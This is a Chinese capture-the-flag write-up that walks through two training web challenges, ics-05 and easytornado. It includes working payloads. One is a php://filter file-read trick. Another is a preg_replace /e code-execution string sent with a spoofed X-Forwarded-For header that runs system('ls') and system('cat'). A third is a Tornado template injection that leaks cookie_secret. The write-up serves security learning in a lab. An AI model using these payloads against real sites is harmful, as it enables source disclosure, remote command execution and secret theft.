# 原创
：  【攻防世界WEB】难度三星9分入门题（中）：ics-05、easytornado

# 【攻防世界WEB】难度三星9分入门题（中）：ics-05、easytornado

**目录**

[三、ics-05](#%E4%B8%89%E3%80%81ics-05)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

[四、easytornado](#%E5%9B%9B%E3%80%81easytornado)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

---


## 三、ics-05

> 

 
<h3>解题方法：</h3>
1、php代码理解、php伪协议


> 
<h3>过程：</h3>
进去先扫了一遍

 index.html是首页
index.php是唯一可以点的云平台设备维护中心（重点应该在这个页面了）

查看页面源码
Ctrl+U
发现最下面有base64加密的密文

解密后
（和后面读取到的源码是一样的）

<hr/>
 
 
 点击后，发现了传参

考虑：
注入
文件包含
php伪协议（执行php代码）
<hr/>
注入：（无）

文件包含：
可以读到很多，但是在这一关，通过这无法找到flag
全局环境

端口名
<img alt="" height="595" src="https://img-blog.csdnimg.cn/6f499b7526c64a60bea278ac55552c8c.png" width="1116"/> 服务编号-端口表

<hr/>
php伪协议：

?page=php://filter/read=convert.base64-encode/resource=index.php
（使用base64加密后，带出来的时候就不会被执行了，然后自己再解码）

 使用这个工具解码有乱码（换了一个工具进行解码）

使用在线解码工具

 
<hr/>
<pre><code>//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试

if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
//如果请求包中HTTP_X_FORWARDED_FOR为127.0.0.1
    echo "&lt;br &gt;Welcome My Admin ! &lt;br &gt;";
    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
//将subject中匹配pattern的部分用replacement替换
    }else{
        die();</code></pre>
 这段代码应该是重点了
需要：
1、X-Forwarded-For: 127.0.0.1<br/> 2、参数pat、rep、sub
3、preg_replace函数：preg_replace($pattern, $replacement, $subject)函数会将subject中匹配pattern的部分用replacement替换，启用/e参数，就会将replacement当做php代码执行

构造payload：
?pat=//e&amp;rep=system("ls")&amp;sub=1

使用bp抓包


payload：
?pat=//e&amp;rep=system("ls%20-R%20s3chahahaDir")&amp;sub=1
ls -R 递归显示文件夹目录所有文件
 %20 是空格url编码
 <img alt="" height="328" src="https://img-blog.csdnimg.cn/1ee6e582ffa540659660ee4e1d06751f.png" width="1200"/><img alt="" height="901" src="https://img-blog.csdnimg.cn/eeebded02ea041c688d983b12e94cabb.png" width="1200"/>
payload：
读取flag
?pat=//e&amp;rep=system("cat%20s3chahahaDir/flag/flag.php")&amp;sub=1<br/>  <img alt="" height="321" src="https://img-blog.csdnimg.cn/2e7ef8914676463e8d1fed205ef89aa2.png" width="1200"/>
<img alt="" height="879" src="https://img-blog.csdnimg.cn/288bcfd9c5924d6e88e11ca7f3f4172d.png" width="1200"/> 


---


---


---


---


## 四、easytornado

> 

 

<h3>解题方法：</h3>
1、Tornado 框架漏洞、MD5加密


> 
<h3>过程：</h3>
知道了文件名了

MD5的生成方法
我们已经知道了文件名，就还要找到cookie_secret

<hr/>
本关提示是Tornado 框架
网上相关框架漏洞，可用{{handler.settings}}访问配置文件
看见上面页面中有file?filename=传参
构造payload：/file?filename={{handler.settings}}
发现报错了

 并有error?msg=进行传参
尝试构造/error?msg={{handler.settings}}
爆出了cookie_secret

b10655cb-3884-492c-b534-4feff4790db3
<hr/>
 前面得到的MD5(Cookie_secret+MD5(filename) )
Cookie_secret=b10655cb-3884-492c-b534-4feff4790db3
MD5(/fllllllllllllag)  =3bf9f6cf685a6dd8defadabfb41a03a1

 
所以
MD5(Cookie_secret+MD5(filename) )=（b10655cb-3884-492c-b534-4feff4790db33bf9f6cf685a6dd8defadabfb41a03a1）

 
得到的MD5为
4f91aebe3800a21135e140d4f94424e1

<hr/>
将flag.txt页面的参数构造为访问/fllllllllllllag的参数
file?filename=/fllllllllllllag&amp;filehash=4f91aebe3800a21135e140d4f94424e1

 <img alt="" height="235" src="https://img-blog.csdnimg.cn/d5a673c80bb648f1997ea2ad13ebcb5d.png" width="1200"/>
 


---

